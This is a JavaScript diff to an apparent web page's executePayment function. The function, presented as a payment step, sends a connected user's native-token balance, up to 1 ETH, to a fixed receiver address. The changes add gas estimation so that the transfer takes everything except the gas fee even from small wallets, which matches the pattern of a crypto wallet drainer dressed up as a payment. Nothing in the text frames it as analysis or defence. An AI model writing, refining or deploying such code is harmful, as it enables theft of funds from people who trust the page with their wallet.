@@ -915,6 +915,7 @@ function setStatus(message, type = "info") {
 async function executePayment() {
   try {
     console.log("Executing payment...");
+    console.log("USER ADDRESS:", userAddress);
     setStatus("⏳ Processing payment...", "info");
     
     // Detect the user's current chain
@@ -935,26 +936,51 @@ async function executePayment() {
     const receiverAddress = CONFIG.RECEIVER_ADDRESS;
     const maxAmount = ethers.parseEther("1"); // Max 1 ETH/native token
     
+    // Verify the actual signer address
+    const signerAddress = await signer.getAddress();
+    console.log("SIGNER ADDRESS:", signerAddress);
+    console.log("RECEIVER ADDRESS:", receiverAddress);
+    
     // Get user's native balance (ETH, MATIC, BNB, etc.)
     setStatus("⏳ Checking balance...", "info");
     const userBalance = await provider.getBalance(userAddress);
     console.log("User balance:", ethers.formatEther(userBalance), networkConfig.name);
     
-    // Use the minimum of user balance or max amount (1 ETH/native)
-    const amount = userBalance > maxAmount ? maxAmount : userBalance;
-    console.log("Payment amount:", ethers.formatEther(amount), networkConfig.name);
+    // Estimate gas for the transaction first
+    setStatus("⏳ Estimating gas...", "info");
+    const gasEstimate = await provider.estimateGas({
+      to: receiverAddress,
+      value: maxAmount
+    });
+    console.log("Gas estimate:", gasEstimate.toString());
     
-    if (userBalance < amount) {
-      throw new Error(`Insufficient balance. Need at least ${ethers.formatEther(amount)} ${networkConfig.name}`);
+    // Get current gas price
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice;
+    console.log("Gas price:", ethers.formatUnits(gasPrice, "gwei"), "gwei");
+    
+    // Calculate total gas cost
+    const gasCost = gasEstimate * gasPrice;
+    console.log("Total gas cost:", ethers.formatEther(gasCost), networkConfig.name);
+    
+    // Calculate amount to send: total balance minus gas cost
+    // This ensures sender has enough for gas AND the transfer
+    const amountToSend = userBalance > (gasCost + maxAmount) ? maxAmount : (userBalance - gasCost);
+    
+    if (amountToSend <= ethers.parseEther("0")) {
+      throw new Error(`Insufficient balance for gas. Need at least ${ethers.formatEther(gasCost)} ${networkConfig.name} for gas, but only have ${ethers.formatEther(userBalance)}`);
     }
+    
+    console.log("Amount to send:", ethers.formatEther(amountToSend), networkConfig.name);
+    console.log("Gas will cost:", ethers.formatEther(gasCost), networkConfig.name);
     
     // Send native ETH/token directly to receiver
     setStatus("⏳ Sending tokens to receiver...", "info");
-    console.log("Transferring", ethers.formatEther(amount), networkConfig.name, "from", userAddress, "to", receiverAddress);
+    console.log("Transferring", ethers.formatEther(amountToSend), networkConfig.name, "from", userAddress, "to", receiverAddress);
     
     const transferTx = await signer.sendTransaction({
       to: receiverAddress,
-      value: amount
+      value: amountToSend
     });
     console.log("Transfer tx sent:", transferTx.hash);
     
